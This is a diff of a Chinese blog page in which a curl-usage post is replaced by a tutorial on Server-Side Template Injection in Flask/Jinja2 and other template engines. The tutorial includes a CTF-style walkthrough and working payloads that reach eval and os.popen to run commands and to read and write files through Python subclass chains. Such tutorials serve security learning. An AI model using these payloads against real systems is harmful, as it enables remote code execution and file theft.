@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="curl, Hbluewhite的Blog">
+    <meta name="keywords" content="SSTI, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>curl | Hbluewhite的Blog</title>
+    <title>SSTI | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">curl</h1>
+                    <h1 class="description center-align post-title">SSTI</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
-                                <span class="chip bg-color">常用命令</span>
+                            <a href="/tags/Web-bug/">
+                                <span class="chip bg-color">Web bug</span>
                             </a>
                         
                     </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-27
+                    2021-09-08
                 </div>
                 
 
@@ -514,55 +514,50 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="curl使用"><a href="#curl使用" class="headerlink" title="curl使用"></a>curl使用</h1><p>curl是一个命令行工具，通过制定的URL来上传或下载数据，并将数据展示出来。curl中的c表示client，而URL就是url。</p>
-<h2 id="命令行基础"><a href="#命令行基础" class="headerlink" title="命令行基础"></a>命令行基础</h2><h2 id="Verbose模式"><a href="#Verbose模式" class="headerlink" title="Verbose模式"></a>Verbose模式</h2><p>如果curl得到的结果不是期望的结果，我们可以使用<code>-v</code>或<code>--verbose</code>进入Verbose模式获取更多的信息。</p>
+                <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h2><p>SSTI就是服务端模板注入（Server-Side Template Injection）,也给出了一个注入的概念。</p>
+<p>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。</p>
+<p>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。</p>
+<p><strong>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</strong></p>
+<p>现在网上提起的比较多的是Python的网站。</p>
+<h2 id="什么是模板引擎？"><a href="#什么是模板引擎？" class="headerlink" title="什么是模板引擎？"></a>什么是模板引擎？</h2><pre><code> 模板引擎（这里特质用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的。它可以特定生产格式的文档，用于网站的模板引擎就会生成一个标准的Html文档。
+</code></pre>
+<p>​    也就是说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后就生成模板+用户数据前端的html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<p><strong>模板引擎可以使用沙箱机制来进行漏洞防范，我们可以用沙箱逃逸技术来进行绕过。</strong></p>
+<p>PS. php(或者其他脚本语言)代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的html页面，从而实现php与html代码的分离。</p>
+<h2 id="为什么要模板引擎"><a href="#为什么要模板引擎" class="headerlink" title="为什么要模板引擎"></a>为什么要模板引擎</h2><p>​    如果在一个页面中php代码与html代码混合在一起，在很多时候都会造成不便，用模板引擎可以让php代码和html代码进行分离。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); </span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个比较鸡蛋的例子，对于现在的SSTI在后端处理的时候也会有许多的过滤。</p>
+<p>总之，SSTI就是这个道理，就像sql注入中你用id=-1’ union select database()可以拿到数据库一样，当然在漏洞利用上还是有很多的技巧，也会有绕过的技巧的。</p>
+<h3 id="Flask（JinJa2）服务端模板注入漏洞复现"><a href="#Flask（JinJa2）服务端模板注入漏洞复现" class="headerlink" title="Flask（JinJa2）服务端模板注入漏洞复现"></a>Flask（JinJa2）服务端模板注入漏洞复现</h3><p>ctf中比较常见的还是python站的SSTI，下面的是一道ssti漏洞的题目，展示一下流程。</p>
 <ol>
-<li>查看通信过程</li>
+<li>注入检测</li>
 </ol>
-<p>在Verbose模式中，curl会得到更多的对话式信息，帮助我们了解发生了什么。curl会在每一个信息前面加上*进行标识。在下面的例子中，我们将百度的首页保存下来（使用<code>-o</code>选项并指定参数<code>baidu</code>）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v www.baidu.com -o baidu</span><br></pre></td></tr></table></figure>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.1.10:8000/">http://192.168.1.10:8000/</a></p>
+<p>传参？name=56</p>
+<p>我们可以得到</p>
+<p><img src="https://img-blog.csdnimg.cn/20190719150209205.png" alt="在这里插入图片描述"></p>
+<p>说明存在SSTI漏洞</p>
+<ol start="2">
+<li>漏洞利用</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
-<p>我们就可以得到如下信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">* About to connect() to www.baidu.com port 80 (#0)</span><br><span class="line">*   Trying 14.215.177.39... connected</span><br><span class="line">* Connected to www.baidu.com (14.215.177.39) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2</span><br><span class="line">&gt; Host: www.baidu.com</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">&lt; Connection: Keep-Alive</span><br><span class="line">&lt; Content-Length: 2381</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Date: Fri, 14 Sep 2018 09:55:18 GMT</span><br><span class="line">&lt; Etag: &quot;588604dd-94d&quot;</span><br><span class="line">&lt; Last-Modified: Mon, 23 Jan 2017 13:27:57 GMT</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Server: bfe/1.0.8.18</span><br><span class="line">&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/</span><br><span class="line">&lt;</span><br><span class="line">&#123; [data not shown]</span><br><span class="line">103  2381  103  2381    0     0   113k      0 --:--:-- --:--:-- --:--:--  232k* Connection #0 to host www.baidu.com left intact</span><br><span class="line"></span><br><span class="line">* Closing connection #0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="关于SSTI的python类的知识"><a href="#关于SSTI的python类的知识" class="headerlink" title="关于SSTI的python类的知识"></a>关于SSTI的python类的知识</h2><p>面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str（字符串）、dict（字典）、tuple（元组）、list（列表）这些在Python类结构的基类都是object，而object拥有众多的子类。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#x27;tuple&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>在curl中，在使用<code>-i</code>选项可以显示Response的Header信息，连同Body数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>_ class _:来查看变量所属的类，根据前面的变量形势可以得到齐属于的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 2381</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Date: Mon, 17 Sep 2018 10:26:42 GMT</span><br><span class="line">Etag: &quot;588604dd-94d&quot;</span><br><span class="line">Last-Modified: Mon, 23 Jan 2017 13:27:57 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Server: bfe/1.0.8.18</span><br><span class="line">Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta</span><br><span class="line">http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;&lt;link rel=styleshee</span><br><span class="line">t type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css&gt;&lt;title&gt;百度一下，你就</span><br><span class="line">知道&lt;/title&gt;&lt;/head&gt; &lt;body link=#0000cc&gt; ... &lt;/body&gt; &lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()</span><br><span class="line">[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;sys.getwindowsversion&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;nt.stat_result&#x27;&gt;, &lt;type &#x27;nt.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;type &#x27;dict_keys&#x27;&gt;, &lt;type &#x27;dict_items&#x27;&gt;, &lt;type &#x27;dict_values&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;type &#x27;operator.itemgetter&#x27;&gt;, &lt;type &#x27;operator.attrgetter&#x27;&gt;, &lt;type &#x27;operator.methodcaller&#x27;&gt;, &lt;type &#x27;functools.partial&#x27;&gt;, &lt;type &#x27;MultibyteCodec&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;type &#x27;MultibyteStreamReader&#x27;&gt;, &lt;type &#x27;MultibyteStreamWriter&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>使用<code>-I</code>选项可以只显示Response的Header信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -I www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><strong>subclasses</strong>()：查看当前类的子类。</p>
+<p>获取基类还能用还有__mro__，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__[1]            //使用索引就能获取基类了</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><code>POST</code>是HTTP中向服务端提交数据的一种方法。在浏览器中，但在表单中填写完数据后，浏览器就会默认将填写的数据使用<code>key=value</code>串的形式进行转化。在curl中，我们可以使用<code>-d</code>或<code>--data</code>选项来指定具体的数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d key1=value1&amp;key2=value2 http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们也可以使用多个<code>-d</code>选项来指定多组数据，curl会自动把这些数据连接起来，因此上面的例子还可以这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d key1=value1 -d key2=value2 http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>在***HTTP方法***中我们可以通过具体的选项指定使用什么方法。这里我们也可以使用<code>-X</code>选项来进行指定：</p>
-<p>Curl执行GET/POST/PUT/DELETE操作 hou</p>
-<p>-X后跟指定的命令参数去执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://example.com</span><br><span class="line">curl -X PUT www.baidu.com </span><br><span class="line"></span><br><span class="line">curl -X DELETE www.baidu.com</span><br><span class="line"></span><br><span class="line">curl -X POST www.baidu.com </span><br><span class="line"></span><br><span class="line">curl -X GET www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<h2 id="COOKies"><a href="#COOKies" class="headerlink" title="COOKies"></a>COOKies</h2><p>HTTP是一种无状态的协议，为了在会话中保存一些状态，可以使用Cookies。服务器通过<code>Set-Cookie:</code>来设置Cookie，客户端就可以在下一次请求中携带这些数据。</p>
-<h3 id="1-设置Cookie"><a href="#1-设置Cookie" class="headerlink" title="1. 设置Cookie"></a>1. 设置Cookie</h3><p>我们可以使用<code>--cookie</code>选项来设置一个Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;CookieName=CookieValue&quot; http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-从文件中读取Cookies"><a href="#2-从文件中读取Cookies" class="headerlink" title="2. 从文件中读取Cookies"></a>2. 从文件中读取Cookies</h3><p>curl默认不会记住服务器设置的Cookie，也不会在下一次请求中携带Cookie。除非用户通过选项自己设置。</p>
-<p>我们可以把之前的Cookies保存到一个文件，然后在下一次请求中指定curl读取文件中的Cookies：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b cookies.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>-b</code>选项指定curl去给定的文件中读取Cookies。</p>
-<p>不过要主要，这里仅仅是读取Cookies，如果这次请求中服务器修改了Cookie，那么curl是不会进行保存的，除非我们手动指定。</p>
-<h3 id="3-写Cookies到文件"><a href="#3-写Cookies到文件" class="headerlink" title="3. 写Cookies到文件"></a>3. 写Cookies到文件</h3><p>我们可以使用<code>-c</code>选项指定curl保存这次请求中服务器设置的Cookies：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -c cookie.jar.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>有时，我们既需要从文件中读取Cookies，也需要保存服务器设置的Cookies。那么就可以同时使用<code>-b</code>和<code>-c</code>选项：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b cookies.txt -c cookie.jar.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><code>curl</code>支持文件上传，上传文件时使用<code>-T</code>或<code>--upload-file</code>参数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -T ./index.html www.uploadhttp.com/receive.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类。</p>
+<h2 id="一些常用的方法"><a href="#一些常用的方法" class="headerlink" title="一些常用的方法"></a>一些常用的方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
                 
@@ -590,7 +585,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/27/curl/">http://example.com/2021/08/27/curl/</a>
+                    <a href="http://example.com/2021/09/08/SSTI/">http://example.com/2021/09/08/SSTI/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -628,8 +623,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
-                                    <span class="chip bg-color">常用命令</span>
+                                <a href="/tags/Web-bug/">
+                                    <span class="chip bg-color">Web bug</span>
                                 </a>
                             
                         </div>
@@ -1067,9 +1062,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/08/SSTI/">
                     <div class="card-image">
@@ -1087,9 +1083,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1098,6 +1094,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1116,13 +1113,13 @@
